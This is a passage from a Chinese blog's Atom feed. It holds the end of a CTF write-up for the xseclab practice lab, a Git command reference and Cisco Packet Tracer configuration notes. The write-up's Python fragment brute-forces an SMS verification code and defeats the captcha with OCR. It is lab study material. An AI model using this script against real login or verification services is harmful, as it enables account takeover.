s.get(imageurl)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'1.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="built_in">in</span> r.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            <span class="keyword">if</span> i:</span><br><span class="line">                f.write(i)</span><br><span class="line">    <span class="keyword">text</span> = pytesseract.image_to_string(<span class="string">'1.png'</span>).replace(<span class="string">' '</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">data</span> = &#123;<span class="string">'username'</span>: <span class="string">'13388886666'</span>, <span class="string">'mobi_code'</span>: num, <span class="string">'user_code'</span>: <span class="keyword">text</span>, <span class="string">'Login'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    result = s.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(num, <span class="keyword">text</span>, result)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> <span class="built_in">not</span> <span class="built_in">in</span> result:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>pytesseract识别验证码会有误差，多试几次即可<br>也可使用tesserocr</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;key又又找不到了&quot;&gt;&lt;a href=&quot;#key又又找不到了&quot; class=&quot;headerlink&quot; title=&quot;key又又找不到了&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c7
      
    
    </summary>
    
      <category term="WriteUp" scheme="http://AbelChe.com/categories/WriteUp/"/>
    
    
      <category term="web" scheme="http://AbelChe.com/tags/web/"/>
    
      <category term="py脚本" scheme="http://AbelChe.com/tags/py%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>Git基本命令</title>
    <link href="http://AbelChe.com/2018/11/22/Git%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
    <id>http://AbelChe.com/2018/11/22/Git基本命令/</id>
    <published>2018-11-22T06:54:49.000Z</published>
    <updated>2019-08-15T11:02:02.456Z</updated>
    
    <content type="html"><![CDATA[<h2 id="github-仓库本地初始化"><a href="#github-仓库本地初始化" class="headerlink" title="github 仓库本地初始化"></a>github 仓库本地初始化</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">""</span> &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git <span class="keyword">add</span><span class="bash"> README.md</span></span><br><span class="line"><span class="bash">git commit -m <span class="string">"first commit"</span></span></span><br><span class="line"><span class="bash">git remote add origin url</span></span><br><span class="line"><span class="bash">git push -u origin master</span></span><br></pre></td></tr></table></figure><h2 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h2><pre><code>在本地新建一个repo,进入一个项目目录,执行git init,会初始化一个repo,并在当前文件夹下创建一个.git文件夹.</code></pre><h2 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h2><pre><code>获取一个url对应的远程Git repo, 创建一个local copy.一般的格式是git clone [url].clone下来的repo会以url最后一个斜线后面的名称命名,创建一个文件夹,如果想要指定特定的名称,可以git clone [url] newname指定.</code></pre><h2 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a>git status</h2><pre><code>查询repo的状态.git status -s: -s表示short, -s的输出标记会有两列,第一列是对staging区域而言,第二列是对working目录而言.</code></pre><h2 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h2><pre><code>show commit history of a branch.git log --oneline --number: 每条log只显示一行,显示number条.git log --oneline --graph:可以图形化地表示出分支合并历史.git log branchname可以显示特定分支的log.git log --oneline branch1 ^branch2,可以查看在分支1,却不在分支2中的提交.^表示排除这个分支(Window下可能要给^branch2加上引号).git log --decorate会显示出tag信息.git log --author=[author name] 可以指定作者的提交历史.git log --since --before --until --after 根据提交时间筛选log.--no-merges可以将merge的commits排除在外.git log --grep 根据commit信息过滤log: git log --grep=keywords默认情况下, git log --grep --author是OR的关系,即满足一条即被返回,如果你想让它们是AND的关系,可以加上--all-match的option.git log -S: filter by introduced diff.比如: git log -SmethodName (注意S和后面的词之间没有等号分隔).git log -p: show patch introduced at each commit.每一个提交都是一个快照(snapshot),Git会把每次提交的diff计算出来,作为一个patch显示给你看.另一种方法是git show [SHA].git log --stat: show diffstat of changes introduced at each commit.同样是用来看改动的相对信息的,--stat比-p的输出更简单一些.</code></pre><h2 id="git-add"><a href="#git-add" class="headerlink" title="git add"></a>git add</h2><pre><code>在提交之前,Git有一个暂存区(staging area),可以放入新添加的文件或者加入新的改动. commit时提交的改动是上一次加入到staging area中的改动,而不是我们disk上的改动.git add .会递归地添加当前工作目录中的所有文件.</code></pre><h2 id="git-diff"><a href="#git-diff" class="headerlink" title="git diff"></a>git diff</h2><pre><code>不加参数的git diff:show diff of unstaged changes.此命令比较的是工作目录中当前文件和暂存区域快照之间的差异,也就是修改之后还没有暂存起来的变化内容.若要看已经暂存起来的文件和上次提交时的快照之间的差异,可以用:git diff --cached 命令.show diff of staged changes.(Git 1.6.1 及更高版本还允许使用 git diff --staged，效果是相同的).git diff HEADshow diff of all staged or unstated changes.也即比较woking directory和上次提交之间所有的改动.如果想看自从某个版本之后都改动了什么,可以用:git diff [version tag]跟log命令一样,diff也可以加上--stat参数来简化输出.git diff [branchA] [branchB]可以用来比较两个分支.它实际上会返回一个由A到B的patch,不是我们想要的结果.一般我们想要的结果是两个分支分开以后各自的改动都是什么,是由命令:git diff [branchA]…[branchB]给出的.实际上它是:git diff $(git merge-base [branchA] [branchB]) [branchB]的结果.</code></pre><h2 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h2><pre><code>提交已经被add进来的改动.git commit -m “the commit message&quot;git commit -a 会先把所有已经track的文件的改动add进来,然后提交(有点像svn的一次提交,不用先暂存). 对于没有track的文件,还是需要git add一下.git commit --amend 增补提交. 会使用与当前提交节点相同的父节点进行一次新的提交,旧的提交将会被取消.</code></pre><h2 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a>git reset</h2><pre><code>undo changes and commits.这里的HEAD关键字指的是当前分支最末梢最新的一个提交.也就是版本库中该分支上的最新版本.git reset HEAD: unstage files from index and reset pointer to HEAD这个命令用来把不小心add进去的文件从staged状态取出来,可以单独针对某一个文件操作: git reset HEAD - - filename, 这个- - 也可以不加.git reset --softmove HEAD to specific commit reference, index and staging are untouched.git reset --hardunstage files AND undo any changes in the working directory since last commit.使用git reset —hard HEAD进行reset,即上次提交之后,所有staged的改动和工作目录的改动都会消失,还原到上次提交的状态.这里的HEAD可以被写成任何一次提交的SHA-1.不带soft和hard参数的git reset,实际上带的是默认参数mixed.总结:git reset --mixed id,是将git的HEAD变了(也就是提交记录变了),但文件并没有改变，(也就是working tree并没有改变). 取消了commit和add的内容.git reset --soft id. 实际上，是git reset –mixed id 后,又做了一次git add.即取消了commit的内容.git reset --hard id.是将git的HEAD变了,文件也变了.按改动范围排序如下:soft (commit) &lt; mixed (commit + add) &lt; hard (commit + add + local working)</code></pre><h2 id="git-revert"><a href="#git-revert" class="headerlink" title="git revert"></a>git revert</h2><pre><code>反转撤销提交.只要把出错的提交(commit)的名字(reference)作为参数传给命令就可以了.git revert HEAD: 撤销最近的一个提交.git revert会创建一个反向的新提交,可以通过参数-n来告诉Git先不要提交.</code></pre><h2 id="git-rm"><a href="#git-rm" class="headerlink" title="git rm"></a>git rm</h2><pre><code>git rm file: 从staging区移除文件,同时也移除出工作目录.git rm --cached: 从staging区移除文件,但留在工作目录中.git rm --cached从功能上等同于git reset HEAD,清除了缓存区,但不动工作目录树.</code></pre><h2 id="git-clean"><a href="#git-clean" class="headerlink" title="git clean"></a>git clean</h2><pre><code>git clean是从工作目录中移除没有track的文件.通常的参数是git clean -df:-d表示同时移除目录,-f表示force,因为在git的配置文件中, clean.requireForce=true,如果不加-f,clean将会拒绝执行.</code></pre><h2 id="git-mv"><a href="#git-mv" class="headerlink" title="git mv"></a>git mv</h2><pre><code>git rm - - cached orig; mv orig new; git add new</code></pre><h2 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h2><pre><code>把当前的改动压入一个栈.git stash将会把当前目录和index中的所有改动(但不包括未track的文件)压入一个栈,然后留给你一个clean的工作状态,即处于上一次最新提交处.git stash list会显示这个栈的list.git stash apply:取出stash中的上一个项目(stash@{0}),并且应用于当前的工作目录.也可以指定别的项目,比如git stash apply stash@{1}.如果你在应用stash中项目的同时想要删除它,可以用git stash pop删除stash中的项目:git stash drop: 删除上一个,也可指定参数删除指定的一个项目.git stash clear: 删除所有项目.</code></pre><h2 id="git-branch"><a href="#git-branch" class="headerlink" title="git branch"></a>git branch</h2><pre><code>git branch可以用来列出分支,创建分支和删除分支.git branch -v可以看见每一个分支的最后一次提交.git branch: 列出本地所有分支,当前分支会被星号标示出.git branch (branchname): 创建一个新的分支(当你用这种方式创建分支的时候,分支是基于你的上一次提交建立的). git branch -d (branchname): 删除一个分支.删除remote的分支:git push (remote-name) :(branch-name): delete a remote branch.这个是因为完整的命令形式是:git push remote-name local-branch:remote-branch而这里local-branch的部分为空,就意味着删除了remote-branch</code></pre><h2 id="git-checkout"><a href="#git-checkout" class="headerlink" title="git checkout"></a>git checkout</h2><p>　　git checkout (branchname)</p><pre><code>切换到一个分支. git checkout -b (branchname): 创建并切换到新的分支. 这个命令是将git branch newbranch和git checkout newbranch合在一起的结果. checkout还有另一个作用:替换本地改动: git checkout --&lt;filename&gt; 此命令会使用HEAD中的最新内容替换掉你的工作目录中的文件.已添加到暂存区的改动以及新文件都不会受到影响. 注意:git checkout filename会删除该文件中所有没有暂存和提交的改动,这个操作是不可逆的.</code></pre><h2 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a>git merge</h2><pre><code>把一个分支merge进当前的分支.git merge [alias]/[branch]把远程分支merge到当前分支.如果出现冲突,需要手动修改,可以用git mergetool.解决冲突的时候可以用到git diff,解决完之后用git add添加,即表示冲突已经被resolved.</code></pre><h2 id="git-tag"><a href="#git-tag" class="headerlink" title="git tag"></a>git tag</h2><pre><code>tag a point in history as import.会在一个提交上建立永久性的书签,通常是发布一个release版本或者ship了什么东西之后加tag.比如: git tag v1.0git tag -a v1.0, -a参数会允许你添加一些信息,即make an annotated tag.当你运行git tag -a命令的时候,Git会打开一个编辑器让你输入tag信息.我们可以利用commit SHA来给一个过去的提交打tag:git tag -a v0.9 XXXXpush的时候是不包含tag的,如果想包含,可以在push时加上--tags参数.fetch的时候,branch HEAD可以reach的tags是自动被fetch下来的, tags that aren’t reachable from branch heads will be skipped.如果想确保所有的tags都被包含进来,需要加上--tags选项.</code></pre><h2 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a>git remote</h2><pre><code>list, add and delete remote repository aliases.因为不需要每次都用完整的url,所以Git为每一个remote repo的url都建立一个别名,然后用git remote来管理这个list.git remote: 列出remote aliases.如果你clone一个project,Git会自动将原来的url添加进来,别名就叫做:origin.git remote -v:可以看见每一个别名对应的实际url.git remote add [alias] [url]: 添加一个新的remote repo.git remote rm [alias]: 删除一个存在的remote alias.git remote rename [old-alias] [new-alias]: 重命名.git remote set-url [alias] [url]:更新url. 可以加上—push和fetch参数,为同一个别名set不同的存取地址.</code></pre><h2 id="git-fetch"><a href="#git-fetch" class="headerlink" title="git fetch"></a>git fetch</h2><pre><code>download new branches and data from a remote repository.可以git fetch [alias]取某一个远程repo,也可以git fetch --all取到全部repofetch将会取到所有你本地没有的数据,所有取下来的分支可以被叫做remote branches,它们和本地分支一样(可以看diff,log等,也可以merge到其他分支),但是Git不允许你checkout到它们. </code></pre><h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><pre><code>fetch from a remote repo and try to merge into the current branch.pull == fetch + merge FETCH_HEADgit pull会首先执行git fetch,然后执行git merge,把取来的分支的head merge到当前分支.这个merge操作会产生一个新的commit.    如果使用--rebase参数,它会执行git rebase来取代原来的git merge.</code></pre><h2 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h2><pre><code>--rebase不会产生合并的提交,它会将本地的所有提交临时保存为补丁(patch),放在”.git/rebase”目录中,然后将当前分支更新到最新的分支尖端,最后把保存的补丁应用到分支上.rebase的过程中,也许会出现冲突,Git会停止rebase并让你解决冲突,在解决完冲突之后,用git add去更新这些内容,然后无需执行commit,只需要:git rebase --continue就会继续打余下的补丁.git rebase --abort将会终止rebase,当前分支将会回到rebase之前的状态.</code></pre><h2 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h2><pre><code>push your new branches and data to a remote repository.git push [alias] [branch]将会把当前分支merge到alias上的[branch]分支.如果分支已经存在,将会更新,如果不存在,将会添加这个分支.如果有多个人向同一个remote repo push代码, Git会首先在你试图push的分支上运行git log,检查它的历史中是否能看到server上的branch现在的tip,如果本地历史中不能看到server的tip,说明本地的代码不是最新的,Git会拒绝你的push,让你先fetch,merge,之后再push,这样就保证了所有人的改动都会被考虑进来.</code></pre><h2 id="git-reflog"><a href="#git-reflog" class="headerlink" title="git reflog"></a>git reflog</h2><pre><code>git reflog是对reflog进行管理的命令,reflog是git用来记录引用变化的一种机制,比如记录分支的变化或者是HEAD引用的变化.当git reflog不指定引用的时候,默认列出HEAD的reflog.HEAD@{0}代表HEAD当前的值,HEAD@{3}代表HEAD在3次变化之前的值.git会将变化记录到HEAD对应的reflog文件中,其路径为.git/logs/HEAD, 分支的reflog文件都放在.git/logs/refs目录下的子目录中.</code></pre><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号:"></a>特殊符号:</h2><pre><code>^代表父提交,当一个提交有多个父提交时,可以通过在^后面跟上一个数字,表示第几个父提交: ^相当于^1.~&lt;n&gt;相当于连续的&lt;n&gt;个^.</code></pre><p>原帖地址:<br>    <a href="https://www.cnblogs.com/my--sunshine/p/7093412.html" target="_blank" rel="noopener">https://www.cnblogs.com/my–sunshine/p/7093412.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;github-仓库本地初始化&quot;&gt;&lt;a href=&quot;#github-仓库本地初始化&quot; class=&quot;headerlink&quot; title=&quot;github 仓库本地初始化&quot;&gt;&lt;/a&gt;github 仓库本地初始化&lt;/h2&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
      <category term="Git" scheme="http://AbelChe.com/categories/Git/"/>
    
    
      <category term="Git" scheme="http://AbelChe.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>PT基本配置练习</title>
    <link href="http://AbelChe.com/2018/11/18/PT%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%E7%BB%83%E4%B9%A0/"/>
    <id>http://AbelChe.com/2018/11/18/PT基本配置练习/</id>
    <published>2018-11-17T16:45:47.000Z</published>
    <updated>2018-11-17T17:08:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置主机"><a href="#配置主机" class="headerlink" title="配置主机"></a>配置主机</h2><ul><li>ip 、子网掩码、默认网关<blockquote><p>ip 、子网掩码在表格中<br>网关配置路由器 ip 即可</p></blockquote></li></ul><h2 id="交换机-switch"><a href="#交换机-switch" class="headerlink" title="交换机(switch)"></a>交换机(switch)</h2><h3 id="配置主机名称"><a href="#配置主机名称" class="headerlink" title="配置主机名称"></a>配置主机名称</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">enable</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> conf t</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hostname &lt;name&gt;</span></span><br></pre></td></tr></table></figure><h3 id="特权-EXEC-密码"><a href="#特权-EXEC-密码" class="headerlink" title="特权 EXEC 密码"></a>特权 EXEC 密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">enable</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> conf t</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> secret &lt;password&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exit</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">disable</span>//验证</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span>//验证</span></span><br><span class="line">//输入密码，登入即可</span><br></pre></td></tr></table></figure><h3 id="用户-EXEC-密码"><a href="#用户-EXEC-密码" class="headerlink" title="用户 EXEC 密码"></a>用户 EXEC 密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> line console 0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> password &lt;password&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> login</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><h3 id="VTY-线路密码"><a href="#VTY-线路密码" class="headerlink" title="VTY 线路密码"></a>VTY 线路密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> line vty 0 15</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> password &lt;password&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> login</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><h3 id="加密密码"><a href="#加密密码" class="headerlink" title="加密密码"></a>加密密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> service password-encryption</span></span><br></pre></td></tr></table></figure><h3 id="标语"><a href="#标语" class="headerlink" title="标语"></a>标语</h3><p><code># banner motd # &lt;content&gt; #</code></p><h3 id="配置-ip-、子网掩码、默认网关-VLAN"><a href="#配置-ip-、子网掩码、默认网关-VLAN" class="headerlink" title="配置 ip 、子网掩码、默认网关(VLAN)"></a>配置 ip 、子网掩码、默认网关(VLAN)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">enable</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> int vlan 1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ip address &lt;ip-address&gt; &lt;mask&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> description &lt;description&gt;//描述</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> no shutdown</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exit</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ip default-gateway &lt;gateway&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><h2 id="路由器-route"><a href="#路由器-route" class="headerlink" title="路由器(route)"></a>路由器(route)</h2><h3 id="ip-、子网掩码"><a href="#ip-、子网掩码" class="headerlink" title="ip 、子网掩码"></a>ip 、子网掩码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">enable</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> conf t</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> interface &lt;<span class="built_in">type</span>&gt; &lt;num&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ip address &lt;ip&gt; &lt;mask&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> description &lt;description&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> no shutdown</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><h2 id="保存配置"><a href="#保存配置" class="headerlink" title="保存配置"></a>保存配置</h2><p><code># copy running-config start-config</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;配置主机&quot;&gt;&lt;a href=&quot;#配置主机&quot; class=&quot;headerlink&quot; title=&quot;配置主机&quot;&gt;&lt;/a&gt;配置主机&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ip 、子网掩码、默认网关&lt;blockquote&gt;
&lt;p&gt;ip 、子网掩码在表格中&lt;br&gt;网关配置路由器 ip 
      
    
    </summary>
    
    
      <category term="PT练习" scheme="http://AbelChe.com/tags/PT%E7%BB%83%E4%B9%A0/"/>
    
      <category term="cisco" scheme="http://AbelChe.com/tags/cisco/"/>
    
  </entry>
  
</feed>
